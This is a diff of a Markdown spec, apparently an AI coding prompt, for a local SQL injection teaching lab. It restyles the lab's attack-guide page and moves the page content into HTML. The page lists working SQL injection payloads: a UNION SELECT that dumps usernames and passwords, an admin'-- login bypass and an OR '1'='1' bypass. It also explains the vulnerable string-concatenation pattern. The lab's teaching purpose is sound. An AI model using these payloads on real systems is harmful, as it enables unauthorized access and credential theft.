@@ -1,5 +1,19 @@
 # Cursor Prompt: SQL Injection Demo — DevLinks
 
+## Global UI Standard — applies to every server in this lab
+
+| Server type | Theme |
+|-------------|-------|
+| Attacker server / Attack guide | Clone `DASHBOARD_HTML` from `reverse-tabnabbing/attacker-server.js` — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. Copy `<style>` verbatim. |
+| Internal / target server (e.g. SSRF port 3020) | Muted corporate — `#1a1a2e` bg, `#e2e8f0` text |
+| Victim servers | Realistic product UI matching their brand |
+
+**Attacker/guide pages — non-negotiable rules:**
+- Copy the `<style>` block from `DASHBOARD_HTML` in `reverse-tabnabbing/attacker-server.js` **verbatim**. Never recreate or paraphrase it.
+- Body layout: `padding: 2rem` on body. No max-width wrapper div. No centering.
+- Panels: use `.flow-box` and `.credentials-panel` classes (defined in that style block).
+- Navigation: **fixed bottom-left `target-switcher` only.** No other open/link buttons anywhere on the page.
+
 ## Context
 
 Part of the security attack demonstration lab at
@@ -178,21 +192,47 @@ Red top banner:
 
 ## Port 3026 — Attack Guide Server
 
-Muted corporate style, monospace, not hacker-terminal. Same aesthetic as the
-NoSQL guide (3023) and SSRF internal server (3020).
+### UI — MANDATORY: clone from reverse-tabnabbing dashboard
 
-### `GET /`
+Open `demo-attacked/reverse-tabnabbing/attacker-server.js`. Find the
+`DASHBOARD_HTML` constant. Copy its entire `<style>` block **verbatim** — every
+rule, every value, character for character — into this page's `<style>`. Do not
+reinterpret or recreate any CSS. Also copy `SWITCHER_CSS` verbatim.
 
-Header:
+Body layout: no wrapper div, no max-width centering. The body itself has
+`padding: 2rem` — same as the tabnabbing dashboard. Panels use `.flow-box` and
+`.credentials-panel` classes exactly as the tabnabbing dashboard uses them.
+
+**Navigation — fixed bottom-left switcher ONLY.** There must be no other
+"open victim" / "open protected" buttons anywhere on the page.
+
+```html
+<div class="target-switcher">
+  <button class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (:3025)</button>
+  <button class="btn-protected" id="btn-switcher-protected">Protected (:3027)</button>
+</div>
 ```
-SQL Injection — Attack Guide
-How string concatenation turns user input into executable SQL
+
+Switcher JS:
+```js
+document.getElementById('btn-switcher-vulnerable').addEventListener('click', function () {
+  window.open('http://localhost:3025', '_blank');
+});
+document.getElementById('btn-switcher-protected').addEventListener('click', function () {
+  window.open('http://localhost:3027', '_blank');
+});
 ```
 
-**Section 1: The vulnerable pattern**
+### `GET /` — page content
 
-```sql
--- Developer intended:
+```html
+<body>
+  <h1>SQL Injection — Attack Guide</h1>
+  <p class="subtitle">How string concatenation turns user input into executable SQL</p>
+
+  <div class="flow-box" style="max-width:900px">
+    <strong>THE VULNERABLE PATTERN</strong><br><br>
+    <pre>-- Developer intended:
 SELECT * FROM resources WHERE title LIKE '%javascript%'
 
 -- What happens when attacker inputs:  ' UNION SELECT id,username,password,email FROM users--
@@ -200,13 +240,12 @@ SELECT * FROM resources
 WHERE title LIKE '%' UNION SELECT id,username,password,email FROM users--%'
 -- The -- comments out the rest of the original query
 -- UNION appends results from the users table to the resources results
--- attacker now sees usernames and passwords in the search results
-```
+-- attacker now sees usernames and passwords in the search results</pre>
+  </div>
 
-**Section 2: Login bypass**
-
-```sql
--- Developer intended:
+  <div class="flow-box" style="max-width:900px">
+    <strong>LOGIN BYPASS</strong><br><br>
+    <pre>-- Developer intended:
 SELECT * FROM users WHERE username = 'admin' AND password = 'wrongpassword'
 -- → returns nothing — wrong password
 
@@ -214,43 +253,44 @@ SELECT * FROM users WHERE username = 'admin' AND password = 'wrongpassword'
 SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
 -- Everything after -- is a comment
 -- Password check never runs
--- → returns the admin row — login succeeds
-```
+-- → returns the admin row — login succeeds</pre>
+  </div>
 
-**Section 3: Attack payloads to try**
+  <div class="credentials-panel">
+    <h2>Attack Payloads to Try</h2>
+    <table><!-- use buildPayloadRows() --></table>
+    <p style="font-size:0.82rem;color:#94a3b8;margin-top:0.75rem">
+      Note: the original search query selects 5 columns. Add a 5th column
+      ('' or role) to the UNION payload so column counts match.
+    </p>
+  </div>
 
-A table with copy buttons for each payload:
-
-| Target | Where | Payload |
-|--------|-------|---------|
-| Dump users table | Search field | `' UNION SELECT id,username,password,email FROM users--` |
-| Login bypass | Admin username field | `admin'--` |
-| True condition bypass | Admin username field | `' OR '1'='1'--` |
-| Error-based discovery | Search field | `'` (single quote — causes SQLite syntax error) |
-
-**Section 4: SQL vs NoSQL injection**
-
-```
-SQL injection works on any string input — form-encoded or JSON.
+  <div class="credentials-panel" style="margin-top:2rem">
+    <h2>SQL vs NoSQL Injection</h2>
+    <pre>SQL injection works on any string input — form-encoded or JSON.
 The attacker injects SQL keywords and syntax directly into the query string.
 
 NoSQL operator injection (see port 3023) only works on JSON endpoints.
 The attacker injects a MongoDB operator object instead of a string value.
 
 Both are caused by the same root issue: user input treated as query logic
-rather than query data.
+rather than query data.</pre>
+  </div>
+
+  <div class="credentials-panel" style="margin-top:2rem">
+    <h2>Why the UNION Attack Works</h2>
+    <p style="font-size:0.85rem;color:#94a3b8;line-height:1.7;max-width:640px">
+      UNION combines SELECT results — both queries must have the same number of
+      columns. The original query selects 5 columns (id, title, url, tags,
+      author). The injected query must also select exactly 5 columns. If column
+      counts don't match, SQLite throws an error — the attacker adjusts.
+      UNION SELECT is how attackers enumerate and dump arbitrary tables.
+    </p>
+  </div>
+
+  <!-- fixed bottom-left switcher — see above -->
+</body>
 ```
-
-**Section 5: Why the UNION attack works**
-
-Prose explaining:
-- UNION combines SELECT results — both queries must have the same number of columns
-- The original query selects 5 columns (id, title, url, tags, author)
-- The injected query must also select exactly 5 columns
-- If column counts don't match, SQLite throws an error — attacker adjusts
-- UNION SELECT is how attackers enumerate and dump arbitrary tables
-
-**Bottom:** buttons — "Vulnerable DevLinks :3025" and "Protected DevLinks :3027".
 
 ---
 
